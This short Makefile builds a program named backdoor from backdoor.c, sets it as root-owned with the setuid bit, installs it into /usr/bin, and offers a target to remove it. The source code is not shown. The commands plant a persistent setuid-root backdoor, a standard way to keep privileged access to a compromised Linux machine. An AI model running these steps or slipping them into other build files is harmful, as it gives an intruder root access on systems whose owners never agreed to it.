all:
	gcc backdoor.c -o backdoor
	sudo chown root:root backdoor
	sudo chmod u+s backdoor
install:
	sudo cp backdoor /usr/bin/backdoor
remove:
	sudo rm /usr/bin/backdoor
